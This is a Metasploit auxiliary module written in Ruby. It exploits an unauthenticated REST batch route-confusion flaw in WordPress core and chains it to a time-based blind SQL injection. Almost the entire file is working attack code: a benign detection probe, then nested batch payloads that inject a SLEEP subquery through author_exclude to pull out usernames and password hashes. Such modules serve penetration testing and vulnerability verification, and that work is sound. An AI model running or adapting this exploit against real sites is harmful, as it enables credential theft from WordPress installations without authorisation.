##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
  include Msf::Auxiliary::Scanner

  # A deliberately malformed path (no host, no port) for which wp_parse_url() returns false.
  # It seeds one WP_Error into the batch request list, desynchronising $matches from $validation
  # so a sub-request is dispatched under the following sub-request's handler.
  DESYNC_PRIMER = { 'method' => 'POST', 'path' => '///' }.freeze

  # The single-post item route. Its ID need not exist; it just matches the item route, whose
  # schema does not validate the collection-only author_exclude param.
  ITEM_SOURCE = '/wp/v2/posts/999999'.freeze

  # Error codes a desynchronised (vulnerable) batch controller emits for the benign marker probe.
  MARKER_CODES = %w[parse_path_failed block_cannot_read rest_batch_not_allowed].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Core wp2shell Unauthenticated SQL Injection via REST Batch Route Confusion',
        'Description' => %q{
          WordPress core 6.9.0 - 6.9.4 and 7.0.0 - 7.0.1 are affected by an unauthenticated
          SQL injection reachable through the REST API batch endpoint (/batch/v1).

          The batch controller builds parallel $matches (the matched handler per sub-request)
          and $validation (the validation result per sub-request) arrays, then indexes both by
          the same offset when dispatching. A sub-request whose path fails wp_parse_url() is
          appended to $validation but not to $matches, desynchronising the two arrays so a
          sub-request is dispatched under a different sub-request's handler (CVE-2026-63030).

          Nesting the primitive twice lets a GET on the single-post item route
          /wp/v2/posts/999999, carrying the collection-only parameter author_exclude, be
          dispatched under the posts collection get_items() handler, where author_exclude maps
          to the WP_Query author__not_in query var. The vulnerable builds interpolate that value
          into SQL as a string (CVE-2026-60137), producing a pre-authentication boolean- and
          time-based blind SQL injection in the post_author NOT IN (...) clause.

          This module confirms the route-confusion primitive with a benign marker probe, then
          uses a time-based blind injection to dump WordPress user logins and password hashes.
          It is read-only and does not create posts, users, or other content.
        },
        'Author' => [
          'dividesbyzer0', # Metasploit module
          'Searchlight Cyber' # wp2shell discovery and advisory
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-63030'],
          ['CVE', '2026-60137'],
          ['URL', 'https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core/'],
          ['URL', 'https://blog.zsec.uk/wp2shell-code-trace-deep-dive/'],
          ['URL', 'https://github.com/Icex0/wp2shell-poc']
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Dump username and password hash for COUNT users via blind SQLi' }]
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2026-07-17',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3])
    ])
  end

  # POST a batch payload to the unauthenticated REST batch endpoint. The ?rest_route= form works
  # on any install, including the plain-permalinks default; /wp-json/ would require pretty permalinks.
  def batch_post(payload)
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/'),
      'vars_get' => { 'rest_route' => '/batch/v1' },
      'ctype' => 'application/json',
      'data' => payload.to_json
    )
  end

  # Benign detection: a batch arranged so that only a desynchronised (vulnerable) controller emits
  # the full MARKER_CODES set. No SQL is injected and no content is created.
  def route_confusion?
    res = batch_post(
      'requests' => [
        DESYNC_PRIMER,
        { 'method' => 'POST', 'path' => '/wp/v2/posts' },
        { 'method' => 'POST', 'path' => '/wp/v2/block-renderer/core/archives' },
        { 'method' => 'POST', 'path' => '/batch/v1', 'body' => { 'requests' => [] } }
      ]
    )
    return false unless res

    body = res.body.to_s
    MARKER_CODES.all? { |code| body.include?(code) }
  end

  # Build and send the double-nested route-confusion payload that lands +payload+ in the
  # author__not_in SQL clause. Used as the injection transport for the SQLi engine.
  def inject(payload)
    num = Rex::Text.rand_text_numeric(4, 0)
    ali = Rex::Text.rand_text_alpha(4)
    # Break out of post_author NOT IN (<value>); wrap the engine payload in an uncorrelated derived
    # table so a time-based SLEEP fires once, not once per matched row; comment out the remainder.
    author_exclude = "0) AND (SELECT #{num} FROM (SELECT(#{payload}))#{ali})-- -"
    inner = {
      'requests' => [
        DESYNC_PRIMER,
        { 'method' => 'GET', 'path' => "#{ITEM_SOURCE}?author_exclude=#{Rex::Text.uri_encode(author_exclude, 'hex-normal')}" },
        { 'method' => 'GET', 'path' => '/wp/v2/posts' }
      ]
    }
    outer = {
      'requests' => [
        DESYNC_PRIMER,
        { 'method' => 'POST', 'path' => '/wp/v2/posts', 'body' => inner },
        { 'method' => 'POST', 'path' => '/batch/v1', 'body' => { 'requests' => [] } }
      ]
    }
    res = batch_post(outer)
    fail_with(Failure::Unreachable, "#{peer} - Connection failed") unless res
  end

  def run_host(_ip)
    unless route_confusion?
      print_error("#{peer} - REST batch route-confusion markers absent; target is patched or not affected")
      return
    end
    print_good("#{peer} - REST batch route-confusion detected (CVE-2026-63030)")

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      inject(payload)
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Time-based blind SQLi did not confirm; raise SqliDelay for a slow target")
      return
    end
    print_good("#{peer} - Unauthenticated time-based blind SQL injection confirmed (CVE-2026-60137)")

    wordpress_sqli_initialize(@sqli)
    wordpress_sqli_get_users_credentials(datastore['COUNT'])
  end
end
